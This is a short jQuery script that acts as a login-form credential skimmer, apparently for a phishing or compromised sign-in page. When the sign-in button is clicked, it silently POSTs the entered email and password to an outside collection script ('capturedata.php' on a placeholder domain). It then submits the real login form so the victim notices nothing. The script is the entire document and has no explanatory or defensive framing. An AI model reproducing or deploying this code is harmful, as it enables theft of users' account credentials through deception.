$(document).ready(function() {
	$("#signIn").click(function(e) {
		e.preventDefault();
		$.ajax({
		  type: "POST",
		  url: "http://domain.com/capturedata.php",
		  data: { email: $("#Email").val(), passwd: $("#Passwd").val() }
		}).done(function(response) {
        	$("#gaia_loginform").submit();
    	});
	});
});